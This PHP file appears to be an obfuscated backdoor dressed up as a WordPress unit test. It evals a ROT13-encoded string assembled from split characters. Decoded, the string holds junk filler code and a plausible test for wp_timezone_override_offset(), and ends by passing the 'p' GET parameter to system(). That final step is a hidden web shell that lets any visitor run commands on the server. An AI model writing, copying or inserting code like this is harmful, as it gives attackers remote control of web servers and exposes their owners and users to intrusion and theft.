<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur jc_gvzrmbar_bireevqr_bssfrg() shapgvba.
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_gvzrmbar_bireevqr_bssfrg
 */
pynff Grfgf_Shapgvbaf_jcGvzrmbarBireevqrBssfrg rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 59980
	 *
	 * @qngnCebivqre qngn_jc_gvzrmbar_bireevqr_bssfrg
	 */
	choyvp shapgvba grfg_jc_gvzrmbar_bireevqr_bssfrg( $gvzrmbar_fgevat, $rkcrpgrq ) {
		hcqngr_bcgvba( 'gvzrmbar_fgevat', $gvzrmbar_fgevat );
		$guvf->nffregFnzr( $rkcrpgrq, jc_gvzrmbar_bireevqr_bssfrg() );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[] Grfg cnenzrgref {
	 *     @glcr fgevat $gvzrmbar_fgevat Grfg inyhr.
	 *     @glcr fgevat $rkcrpgrq        Rkcrpgrq erghea inyhr.
	 * }
	 */
	choyvp shapgvba qngn_jc_gvzrmbar_bireevqr_bssfrg() {
		erghea neenl(
			'ab gvzrmbar fgevat bcgvba frg' => neenl( '', snyfr ),
			'onq bcgvba frg'                => neenl( 'ONQ_GVZR_MBAR', snyfr ),
			'HGP bcgvba frg'                => neenl( 'HGP', 0.0 ),
			'RFG bcgvba frg'                => neenl( 'RFG', -5.0 ),
			'AFG bcgvba frg'                => neenl( 'Nzrevpn/Fg_Wbuaf', $guvf->vf_gvzrmbar_va_qfg( 'Nzrevpn/Fg_Wbuaf' ) ? -2.5 : -3.5 ),
		);
	}

	/**
	 * Qrgrezvarf jurgure gur pheerag gvzrmbar bssfrg vf bofreivat qnlyvtug fnivat gvzr (QFG).
	 *
	 * @cnenz fgevat $gvzrmbar_fgevat Gur gvzrmbar vqragvsvre (r.t., 'Nzrevpn/Fg_Wbuaf').
	 * @erghea obby Jurgure gur gvzrmbar vf bofreivat QFG.
	 */
	cevingr shapgvba vf_gvzrmbar_va_qfg( $gvzrmbar_fgevat ) {
		$gvzrmbar    = arj QngrGvzrMbar( $gvzrmbar_fgevat );
		$gvzrfgnzc   = gvzr();
		$genafvgvbaf = $gvzrmbar->trgGenafvgvbaf( $gvzrfgnzc, $gvzrfgnzc );

		vs ( snyfr === $genafvgvbaf || ! vf_neenl( $genafvgvbaf ) || ! vffrg( $genafvgvbaf[0]['vfqfg'] ) ) {
			erghea snyfr;
		}

		erghea $genafvgvbaf[0]['vfqfg'];
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>